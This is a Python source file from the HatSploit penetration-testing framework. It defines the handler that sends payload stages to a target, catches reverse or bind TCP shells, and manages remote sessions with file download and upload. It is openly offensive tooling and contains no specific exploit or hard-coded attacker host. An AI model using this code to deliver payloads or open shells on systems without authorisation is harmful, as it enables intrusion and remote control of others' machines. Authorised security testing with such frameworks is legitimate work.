#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import datetime

from hatasm import HatAsm

from pex.post import Post
from pex.post.pull import Pull
from pex.post.push import Push

from pex.post import PostTools
from pex.type import Type

from pex.proto.channel import ChannelClient

from hatsploit.core.cli.badges import Badges

from hatsploit.lib.handle import Handle
from hatsploit.lib.blinder import Blinder
from hatsploit.lib.jobs import Jobs
from hatsploit.lib.modules import Modules
from hatsploit.lib.payloads import Payloads
from hatsploit.lib.encoders import Encoders
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.storage import LocalStorage
from hatsploit.lib.session import Session
from hatsploit.lib.loot import Loot


class HatSploitSession(Session, Loot, Pull, Push, ChannelClient):
    channel = None

    details = {
        'Post': "",
        'Platform': "",
        'Architecture': "",
        'Type': "shell"
    }

    def open(self, client):
        self.channel = self.open_channel(client)

    def close(self):
        self.channel.disconnect()

    def heartbeat(self):
        return not self.channel.terminated

    def send_command(self, command, output=False, decode=True):
        return self.channel.send_command(
            (command + '\n'),
            output,
            decode
        )

    def download(self, remote_file, local_path):
        self.print_process(f"Downloading {remote_file}...")

        data = self.pull(
            platform=self.details['Platform'],
            sender=self.send_command,
            location=remote_file,
            args={
                'decode': False,
                'output': True
            }
        )

        if data:
            return self.save_file(
                location=local_path,
                data=data,
                filename=remote_file
            )

        return None

    def upload(self, local_file, remote_path):
        self.print_process(f"Uploading {local_file}...")
        data = self.get_file(local_file)

        if data:
            remote_path = self.push(
                platform=self.details['Platform'],
                sender=self.send_command,
                data=data,
                location=remote_path,
                method=self.details['Post']
            )

            self.print_success(f"Saved to {remote_path}!")
            return remote_path

        return None

    def interact(self):
        self.channel.interact()


class Handler:
    blinder = Blinder()
    post = Post()
    post_tools = PostTools()
    server_handle = Handle()

    sessions = Sessions()
    modules = Modules()
    payloads = Payloads()
    encoders = Encoders()
    jobs = Jobs()
    types = Type()
    badges = Badges()
    local_storage = LocalStorage()

    def do_job(self, p_type, target, args):
        if p_type == 'one_side':
            target(*args)
        else:
            self.jobs.create_job(
                None,
                None,
                target,
                args,
                True
            )

    def ensure_linemax(self, stage, linemax):
        min_size = 10000
        max_size = 100000

        if len(stage) >= max_size and linemax not in range(min_size, max_size):
            self.badges.print_process(f"Ensuring stage size ({str(len(stage))} bytes)...")
            linemax = max_size

        return linemax

    def send(self, sender, stage, args={}):
        if isinstance(stage, bytes):
            self.badges.print_process(f"Sending payload stage ({str(len(stage))} bytes)...")
        else:
            self.badges.print_process("Sending command payload stage...")

        self.post_tools.post_command(sender, stage, args)

    def open_session(self, host, port, s_platform, s_architecture, s_type, session, action=None):
        s_id = self.sessions.add_session(s_platform, s_architecture, s_type, host, port, session)
        time = datetime.datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")

        self.badges.print_success(f"{s_type.title()} session {str(s_id)} opened at {time}!")

        if action:
            action()

        if self.local_storage.get("auto_interaction"):
            self.sessions.interact_with_session(s_id)

    def module_handle(self, host=None, sender=None, args={}, concat=None, location=None,
                      background=None, method=None, timeout=None, linemax=100, ensure=False,
                      on_session=None):
        module = self.modules.get_current_module()
        payload = self.payloads.get_current_payload()

        rhost = host
        options = module.handler

        if 'BLINDER' in options:
            if options['BLINDER'].lower() in ['yes', 'y']:
                if sender is not None:
                    self.handle(
                        sender=sender,
                        args=args,
                        blinder=True
                    )

                    return True

        stage = self.payloads.pack_payload(module.payload['Payload'])

        if payload.details['Type'] == 'bind_tcp':
            host = options['RBHOST']
            port = options['RBPORT']

        elif payload.details['Type'] == 'reverse_tcp':
            host = options['LHOST']
            port = options['LPORT']

        else:
            host, port = None, None

        if 'Session' in payload.details:
            session = payload.details['Session']
        else:
            session = None

        if 'Arguments' in payload.details:
            arguments = payload.details['Arguments']
        else:
            arguments = None

        p_platform = payload.details['Platform']
        p_architecture = payload.details['Architecture']

        if p_platform in self.types.platforms:
            module_platform = module.details['Platform']

            if module_platform not in self.types.platforms:
                p_platform = module_platform

        return self.handle(
            stage=stage,
            sender=sender,

            host=host,
            port=port,

            rhost=rhost,

            p_platform=p_platform,
            p_architecture=p_architecture,
            p_type=payload.details['Type'],

            args=args,
            concat=concat,
            location=location,
            background=background,

            method=method,
            timeout=timeout,
            linemax=linemax,

            ensure=ensure,
            blinder=False,

            session=session,
            arguments=arguments,
            on_session=on_session
        )

    def handle(self, stage=None, sender=None, host=None, port=None, rhost=None,
               p_platform=None, p_architecture=None, p_type=None, args={},
               concat=None, location=None, background=None, method=None, timeout=None, linemax=100,
               ensure=False, blinder=False, session=None, arguments=None, on_session=None):

        if blinder:
            self.blinder.shell(sender, args)
            return True

        if not self.send_payload(
            stage=stage,
            sender=sender,

            p_platform=p_platform,
            p_architecture=p_architecture,
            p_type=p_type,

            args=args,
            concat=concat,
            location=location,
            background=background,

            method=method,
            linemax=linemax,

            ensure=ensure,
            arguments=arguments
        ):
            self.badges.print_error("Failed to send payload stage!")
            return False

        remote = self.handle_session(
            host=host,
            port=port,

            p_type=p_type,
            session=session,
            timeout=timeout
        )

        if not remote:
            self.badges.print_warning("Payload sent but no session was opened.")
            return True

        s_type = remote[0].details['Type']

        remote[0].details['Post'] = method
        remote[0].details['Platform'] = p_platform
        remote[0].details['Architecture'] = p_architecture

        if remote[1] not in ('127.0.0.1', '0.0.0.0'):
            rhost = remote[1]

        self.open_session(rhost, port, p_platform, p_architecture, s_type, remote[0], on_session)
        return True

    def module_handle_session(self, p_type='one_side', session=None, timeout=None):
        module = self.modules.get_current_module()

        options = module.handler
        session = session if session is not None else HatSploitSession

        if p_type == 'reverse_tcp':
            new_session, host = self.server_handle.listen_session(
                options['LHOST'],
                options['LPORT'],
                session, timeout
            )

            if not new_session and not host:
                return None

        elif p_type == 'bind_tcp':
            host = options['RBHOST']

            new_session = self.server_handle.connect_session(
                options['RBHOST'],
                options['RBPORT'],
                session, timeout
            )

            if not new_session:
                return None

        else:
            return None

        return new_session, host

    def handle_session(self, host=None, port=None, p_type='one_side', session=None, timeout=None):
        session = session if session is not None else HatSploitSession

        if p_type == 'reverse_tcp':
            if not host or not port:
                return None

            new_session, host = self.server_handle.listen_session(host, port, session, timeout)

            if not new_session and not host:
                return None

        elif p_type == 'bind_tcp':
            if not host or not port:
                return None

            new_session = self.server_handle.connect_session(host, port, session, timeout)

            if not new_session:
                return None

        elif p_type == 'one_side':
            return None

        else:
            self.badges.print_error("Invalid payload type!")
            return None

        return new_session, host

    def send_payload(self, stage=None, sender=None, p_platform='generic',
                     p_architecture='generic', p_type='one_side', args={}, concat=None,
                     location=None, background=None, method=None, linemax=100,
                     ensure=False, arguments=None):
        if stage is None:
            self.badges.print_error("Payload stage is not found!")
            return False

        if sender is None:
            self.badges.print_error("No sender found!")
            return False

        if ensure:
            linemax = self.ensure_linemax(stage, linemax)

        architectures = self.types.architectures["cpu"] + list(self.types.architectures["generic"])

        if p_architecture not in architectures:
            self.do_job(
                p_type,
                self.send,
                [
                    sender,
                    stage,
                    args
                ]
            )
        else:
            self.badges.print_process(f"Sending payload stage ({str(len(stage))} bytes)...")

            self.do_job(
                p_type,
                self.post.post,
                [
                    stage,
                    sender,
                    p_platform,
                    p_architecture,
                    args,
                    arguments,
                    method,
                    location,
                    concat,
                    background,
                    linemax
                ]
            )

        return True
